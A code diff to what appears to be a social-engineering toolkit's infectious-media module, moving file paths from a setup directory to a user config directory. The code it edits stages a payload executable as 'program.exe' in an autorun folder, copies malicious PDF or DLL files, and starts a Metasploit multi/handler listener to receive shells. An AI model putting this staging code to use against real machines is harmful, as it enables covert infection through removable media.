@@ -12,7 +12,7 @@ import src.core.setcore as core
 definepath = os.getcwd()
 msf_path = core.meta_path()
 me = core.mod_name()
-autorun_path = os.path.join(core.setdir, "autorun")
+autorun_path = os.path.join(core.userconfigpath, "autorun")
 
 trigger = 0
 
@@ -21,23 +21,23 @@ if core.check_options("INFECTION_MEDIA=") == "ON":
     subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                      "mkdir {0} 1> /dev/null 2> /dev/null;"
                      "cp {1} {2} 1> /dev/null 2> /dev/null".format(autorun_path,
-                                                                   os.path.join(core.setdir, "payload.exe"),
+                                                                   os.path.join(core.userconfigpath, "payload.exe"),
                                                                    os.path.join(autorun_path, "program.exe")),
                      shell=True).wait()
 
-if os.path.isfile(os.path.join(core.setdir, "fileformat.file")):
+if os.path.isfile(os.path.join(core.userconfigpath, "fileformat.file")):
     trigger = 2
     subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                      "mkdir {0} 1> /dev/null 2> /dev/null;"
                      "cp {1} {0} 1> /dev/null 2>/dev/null".format(autorun_path,
-                                                                  os.path.join(core.setdir, "template.pdf")),
+                                                                  os.path.join(core.userconfigpath, "template.pdf")),
                      shell=True).wait()
 
-if os.path.isfile(os.path.join(core.setdir, "/dll/openthis.wab")):
+if os.path.isfile(os.path.join(core.userconfigpath, "/dll/openthis.wab")):
     subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                      "mkdir {0} 1> /dev/null 2> /dev/null;"
                      "cp {1} {0} 1> /dev/null 2> /dev/null".format(autorun_path,
-                                                                   os.path.join(core.setdir, "/dll/*")),
+                                                                   os.path.join(core.userconfigpath, "/dll/*")),
                      shell=True).wait()
     trigger = 3
 
@@ -71,9 +71,9 @@ if trigger in [1, 2, 3]:
     if choice1.lower() == "yes" or choice1.lower() == "y":
         # if we used something to create other than solo.py then write out the
         # listener
-        if not os.path.isfile(os.path.join(core.setdir, "meta_config")):
-            with open(os.path.join(core.setdir, "meta_config"), 'w') as filewrite, \
-                    open(os.path.join(core.setdir, "payload.options")) as fileopen:
+        if not os.path.isfile(os.path.join(core.userconfigpath, "meta_config")):
+            with open(os.path.join(core.userconfigpath, "meta_config"), 'w') as filewrite, \
+                    open(os.path.join(core.userconfigpath, "payload.options")) as fileopen:
                 for line in fileopen:
                     line = line.split(" ")
                     filewrite.write("use multi/handler\n")
@@ -86,7 +86,7 @@ if trigger in [1, 2, 3]:
         # create the listener
         core.print_status("Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
         subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
-                                           os.path.join(core.setdir, "meta_config")),
+                                           os.path.join(core.userconfigpath, "meta_config")),
                          shell=True).wait()
     else:
         core.print_warning("cancelling...")
